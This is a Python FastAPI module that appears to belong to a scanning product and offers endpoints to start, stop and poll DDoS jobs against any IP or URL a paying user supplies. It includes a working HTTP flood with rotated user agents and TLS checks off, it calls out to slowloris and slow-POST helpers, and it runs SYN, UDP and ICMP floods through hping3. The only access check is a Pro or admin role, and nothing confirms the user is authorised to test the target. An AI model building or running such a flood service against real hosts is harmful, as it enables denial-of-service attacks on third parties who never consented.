"""
DDoS control endpoints — Phase 9.4.
POST /ddos/start  — launch a DDoS job
POST /ddos/stop   — stop running job
GET  /ddos/{job_id}/status — live metrics via polling
"""
from __future__ import annotations

import asyncio
import uuid
from datetime import datetime, timezone
from typing import Literal

from fastapi import APIRouter, Depends, HTTPException, status
from pydantic import BaseModel, Field

from app.core.deps import get_current_user
from app.core.redis import get_redis
from app.models.user import User

router = APIRouter(prefix="/ddos", tags=["ddos"])

# ── Schemas ───────────────────────────────────────────────────────────────────

class DDoSStartRequest(BaseModel):
    target: str = Field(..., description="IP or URL to test")
    attack_type: Literal["http_flood", "slowloris", "slow_post", "syn_flood", "udp_flood", "icmp_flood"] = "http_flood"
    method: Literal["GET", "POST"] = "GET"
    concurrency: int = Field(50,  ge=1,  le=500)
    duration:    int = Field(30,  ge=5,  le=300)
    intensity:   Literal["low", "medium", "high"] = "medium"


class DDoSStatusResponse(BaseModel):
    job_id:       str
    status:       Literal["running", "stopped", "completed", "error"]
    attack_type:  str
    target:       str
    elapsed:      int          # seconds
    duration:     int
    sent:         int
    success:      int
    errors:       int
    timeouts:     int
    avg_latency:  float | None  # ms
    service_up:   bool | None
    started_at:   str
    findings_count: int


class DDoSStopResponse(BaseModel):
    job_id: str
    stopped: bool


# ── Intensity → concurrency multiplier ───────────────────────────────────────

_INTENSITY_MULT = {"low": 0.3, "medium": 1.0, "high": 2.0}


# ── Active jobs store (Redis-backed) ─────────────────────────────────────────

async def _set_job(redis, job_id: str, data: dict) -> None:
    import json
    await redis.setex(f"ddos:job:{job_id}", 600, json.dumps(data))


async def _get_job(redis, job_id: str) -> dict | None:
    import json
    raw = await redis.get(f"ddos:job:{job_id}")
    if not raw:
        return None
    return json.loads(raw)


async def _stop_signal(redis, job_id: str) -> None:
    await redis.setex(f"ddos:stop:{job_id}", 60, "1")


async def _should_stop(redis, job_id: str) -> bool:
    return bool(await redis.exists(f"ddos:stop:{job_id}"))


# ── Background flood runner ───────────────────────────────────────────────────

async def _flood_runner(job_id: str, req: DDoSStartRequest) -> None:
    """Runs the selected attack type and pushes stats to Redis every second."""
    from app.core.redis import get_redis as _get_redis

    redis = await _get_redis()

    mult = _INTENSITY_MULT[req.intensity]
    effective_concurrency = max(1, int(req.concurrency * mult))

    stats = {
        "job_id":      job_id,
        "status":      "running",
        "attack_type": req.attack_type,
        "target":      req.target,
        "elapsed":     0,
        "duration":    req.duration,
        "sent":        0,
        "success":     0,
        "errors":      0,
        "timeouts":    0,
        "avg_latency": None,
        "service_up":  None,
        "started_at":  datetime.now(timezone.utc).isoformat(),
        "findings_count": 0,
        "latencies":   [],
    }
    await _set_job(redis, job_id, stats)

    try:
        if req.attack_type == "http_flood":
            await _http_flood_runner(redis, job_id, stats, req, effective_concurrency)
        elif req.attack_type in ("slowloris", "slow_post"):
            await _slow_runner(redis, job_id, stats, req)
        elif req.attack_type in ("syn_flood", "udp_flood", "icmp_flood"):
            await _network_runner(redis, job_id, stats, req)

        stats["status"] = "completed"
    except asyncio.CancelledError:
        stats["status"] = "stopped"
    except Exception as e:
        stats["status"] = "error"
        stats["error"] = str(e)[:200]
    finally:
        stats.pop("latencies", None)
        await _set_job(redis, job_id, stats)


async def _http_flood_runner(redis, job_id: str, stats: dict, req: DDoSStartRequest, concurrency: int) -> None:
    import httpx, random, time

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "curl/8.7.1",
        "python-httpx/0.27.0",
    ]

    url = req.target if req.target.startswith("http") else f"http://{req.target}"
    stop_event = asyncio.Event()
    latencies: list[float] = []

    async def worker():
        async with httpx.AsyncClient(verify=False, timeout=5, follow_redirects=False) as client:
            while not stop_event.is_set():
                t0 = time.monotonic()
                try:
                    h = {"User-Agent": random.choice(USER_AGENTS)}
                    if req.method == "POST":
                        r = await client.post(url, headers=h, content=b"x" * 256)
                    else:
                        r = await client.get(url, headers=h)
                    stats["sent"] += 1
                    latencies.append((time.monotonic() - t0) * 1000)
                    if 200 <= r.status_code < 600:
                        stats["success"] += 1
                    else:
                        stats["errors"] += 1
                except httpx.TimeoutException:
                    stats["timeouts"] += 1
                    stats["sent"] += 1
                except Exception:
                    stats["errors"] += 1
                    stats["sent"] += 1

    workers = [asyncio.create_task(worker()) for _ in range(concurrency)]

    for tick in range(req.duration):
        await asyncio.sleep(1)
        stats["elapsed"] = tick + 1
        if latencies:
            stats["avg_latency"] = round(sum(latencies[-200:]) / len(latencies[-200:]), 1)
        stats.pop("latencies", None)
        await _set_job(redis, job_id, stats)
        if await _should_stop(redis, job_id):
            break

    stop_event.set()
    await asyncio.gather(*workers, return_exceptions=True)

    # Final availability check
    try:
        async with httpx.AsyncClient(verify=False, timeout=5) as c:
            r = await c.get(url)
            stats["service_up"] = r.status_code < 600
    except Exception:
        stats["service_up"] = False

    if stats["sent"] > 0:
        timeout_pct = stats["timeouts"] / stats["sent"] * 100
        if timeout_pct >= 50 or not stats["service_up"]:
            stats["findings_count"] = 1


async def _slow_runner(redis, job_id: str, stats: dict, req: DDoSStartRequest) -> None:
    """Simplified slow attack runner — delegates to ddos_slow module."""
    from app.scanner.ddos_slow import _run_slowloris, _run_slow_post, _parse_url, _probe_latency

    host, port, use_ssl, url = _parse_url(
        req.target if req.target.startswith("http") else f"http://{req.target}"
    )

    if req.attack_type == "slowloris":
        peak, _ = await _run_slowloris(None, host, port, use_ssl, req.concurrency, req.duration)  # type: ignore[arg-type]
    else:
        peak, _ = await _run_slow_post(None, url, host, port, use_ssl, req.concurrency // 2, req.duration)  # type: ignore[arg-type]

    post_ms = await _probe_latency(host, port, use_ssl)
    stats["elapsed"]    = req.duration
    stats["service_up"] = post_ms is not None
    stats["sent"]       = peak
    if not stats["service_up"]:
        stats["findings_count"] = 1
    await _set_job(redis, job_id, stats)


async def _network_runner(redis, job_id: str, stats: dict, req: DDoSStartRequest) -> None:
    """Run hping3 for network-layer floods."""
    from app.scanner.ddos_network import _run_hping3, _tcp_probe, _extract_ip, _parse_hping3

    target_ip = _extract_ip(req.target)
    mode_map  = {"syn_flood": "syn", "udp_flood": "udp", "icmp_flood": "icmp"}
    mode = mode_map.get(req.attack_type, "syn")

    rc, out, err = await _run_hping3(None, target_ip, 80, mode, req.duration)  # type: ignore[arg-type]
    sent, _ = _parse_hping3(out + err, mode)
    up, _ = await _tcp_probe(target_ip, 80)

    stats["elapsed"]    = req.duration
    stats["sent"]       = sent
    stats["service_up"] = up
    if not up:
        stats["findings_count"] = 1
    await _set_job(redis, job_id, stats)


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.post("/start", response_model=DDoSStatusResponse)
async def start_ddos(
    req: DDoSStartRequest,
    user: User = Depends(get_current_user),
):
    if not getattr(user, "is_pro", False) and getattr(user, "role", "") != "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="DDoS testing requires Pro plan",
        )

    job_id = str(uuid.uuid4())
    asyncio.create_task(_flood_runner(job_id, req))

    return DDoSStatusResponse(
        job_id=job_id,
        status="running",
        attack_type=req.attack_type,
        target=req.target,
        elapsed=0,
        duration=req.duration,
        sent=0,
        success=0,
        errors=0,
        timeouts=0,
        avg_latency=None,
        service_up=None,
        started_at=datetime.now(timezone.utc).isoformat(),
        findings_count=0,
    )


@router.post("/stop/{job_id}", response_model=DDoSStopResponse)
async def stop_ddos(
    job_id: str,
    user: User = Depends(get_current_user),
):
    redis = await get_redis()
    job = await _get_job(redis, job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    await _stop_signal(redis, job_id)
    return DDoSStopResponse(job_id=job_id, stopped=True)


@router.get("/status/{job_id}", response_model=DDoSStatusResponse)
async def ddos_status(
    job_id: str,
    user: User = Depends(get_current_user),
):
    redis = await get_redis()
    job = await _get_job(redis, job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found or expired")

    return DDoSStatusResponse(
        job_id=job["job_id"],
        status=job["status"],
        attack_type=job["attack_type"],
        target=job["target"],
        elapsed=job.get("elapsed", 0),
        duration=job.get("duration", 0),
        sent=job.get("sent", 0),
        success=job.get("success", 0),
        errors=job.get("errors", 0),
        timeouts=job.get("timeouts", 0),
        avg_latency=job.get("avg_latency"),
        service_up=job.get("service_up"),
        started_at=job.get("started_at", ""),
        findings_count=job.get("findings_count", 0),
    )
